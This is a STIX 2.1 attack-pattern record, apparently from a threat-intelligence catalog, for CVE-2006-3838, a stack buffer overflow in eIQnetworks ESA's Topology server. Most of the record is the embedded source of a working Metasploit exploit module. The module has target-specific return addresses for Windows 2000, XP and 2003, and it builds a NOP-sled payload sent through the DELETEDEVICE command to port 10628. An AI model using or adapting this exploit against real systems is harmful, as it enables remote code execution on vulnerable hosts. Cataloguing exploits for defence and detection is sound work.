{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--53ee7000-a25c-43c9-87d1-ad4b2b504741",
    "created": "2024-08-14T16:45:56.357935Z",
    "modified": "2024-08-14T16:45:56.357939Z",
    "name": "eIQNetworks ESA Topology DELETEDEVICE Overflow",
    "description": " This module exploits a stack buffer overflow in eIQnetworks Enterprise Security Analyzer. During the processing of long arguments to the DELETEDEVICE command in the Topology server, a stack-based buffer overflow occurs.  This module has only been tested against ESA v2.1.13. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/eiqnetworks_esa_topology.rb",
            "external_id": "eiqnetworks_esa_topology.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3838"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'eIQNetworks ESA Topology DELETEDEVICE Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in eIQnetworks\n        Enterprise Security Analyzer. During the processing of\n        long arguments to the DELETEDEVICE command in the Topology\n        server, a stack-based buffer overflow occurs.\n\n        This module has only been tested against ESA v2.1.13.\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          ['CVE', '2006-3838'],\n          ['OSVDB', '27528'],\n          ['BID', '19164'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 250,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29 } ],\n          [ 'Windows XP SP2 English',   { 'Ret' => 0x77d57447 } ],\n          [ 'Windows 2003 SP1 English', { 'Ret' => 0x773b24da } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2006-07-25'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(10628)\n      ])\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    filler  =  rand_text_alphanumeric(128) + [target.ret].pack('V') + make_nops(20)\n\n    sploit  =  \"DELETEDEVICE&\" + filler + payload.encoded\n\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-07-25",
    "x_mitre_platforms": [
        "win'"
    ]
}